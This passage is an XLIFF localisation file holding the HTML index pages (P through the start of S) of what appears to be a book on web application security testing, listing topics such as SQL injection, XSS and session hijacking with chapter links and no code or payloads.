        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html" style="font-weight:bold;"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch09lev1sec8.html#iddle1405"&gt; page caching&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1406"&gt; page maps&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1407"&gt; pages&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1408"&gt; saving&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1409"&gt; PageSpy tool&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1410"&gt; panning for gold&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1411"&gt; how to conduct this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1412"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1413"&gt; when to apply this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1414"&gt; parameters&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CGI parameters
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1109"&gt;CGI parameters&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1416"&gt; GET versus POST&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1417"&gt; user preference parameters&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec8.html#iddle1418"&gt; Paros&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1419"&gt; password protection&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1420"&gt; path attributes&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec3.html#iddle1421"&gt; PCs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1422"&gt; Pederick, Chris&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1423"&gt; performance&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1424"&gt; Perl, taint&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec1.html#iddle1425"&gt; personal user information&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1426"&gt; phishing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1427"&gt; piggybacking&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec1.html#iddle1428"&gt; PII (personally identifiable information)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1429"&gt; Ping, reverse ping&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1430"&gt; ports, control pages&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1431"&gt; POST versus GET&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1432"&gt; principle of least privilege&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch09lev1sec1.html#iddle1433"&gt; privacy&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec9.html#iddle1434"&gt; ActiveX controls&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec9.html#iddle1435"&gt; BHOs (browser helper objects)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec8.html#iddle1436"&gt; caching pages&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec5.html#iddle1437"&gt; Clipboard data&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec4.html#iddle1438"&gt; cookies&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec1.html#iddle1439"&gt; PII (personally identifiable information)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec3.html#iddle1440"&gt; referrer tags&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec2.html#iddle1441"&gt; user agent strings&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch09lev1sec5.html#iddle1442"&gt; Web bugs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1443"&gt; privileged accounts&lt;/a&gt;&lt;br /&gt;protecting against attacks&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1444"&gt; breaking authentication&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1445"&gt; buffer overflows&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1446"&gt; bypass client-side validation&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1447"&gt; bypass restrictions on input choices&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1448"&gt; canonicalization&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1449"&gt; CGI parameters&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1450"&gt; command injection&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1451"&gt; cookie poisoning&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1452"&gt; cross-site tracing&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1453"&gt; denial of service&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1454"&gt; directory traversal&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1455"&gt; fake cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1456"&gt; fingerprinting the server&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1457"&gt; forcing weak cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1458"&gt; guessing files and directories attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1459"&gt; hidden fields&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1460"&gt; NULL string attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1461"&gt; panning for gold&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1462"&gt; session hijacking&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1463"&gt; SQL injection&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1464"&gt; SQL injection II&amp;mdash;stored procedures&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch04lev1sec2.html#iddle1465"&gt; URL jumping&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1466"&gt; XSS&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1467"&gt; push-down automaton&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=O.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=Q.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=P.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html" style="font-weight:bold;"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="app01lev1sec6.html#iddle1468"&gt; quality, Bill Gates&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1469"&gt; question mark (?)&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=P.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=R.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=Q.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html" style="font-weight:bold;"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch03lev1sec2.html#iddle1470"&gt; radio buttons&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1471"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec4.html#iddle1472"&gt; referrer spam&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec3.html#iddle1473"&gt; referrer tags&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1474"&gt; reflected XSS&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1475"&gt; Regulator, The&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1476"&gt; reliability&lt;/a&gt;&lt;br /&gt;removing&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1477"&gt; client-side validation&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1478"&gt; stored procedures&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1479"&gt; restricted users&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1480"&gt; return address&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1481"&gt; reusing code&lt;/a&gt;&lt;a class="v2" href="ch07lev1sec2.html#iddle1482"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1483"&gt; reverse ping&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1484"&gt; ROT13&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1485"&gt; ROT47&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1486"&gt; rows, databases&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=Q.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=S.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=R.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
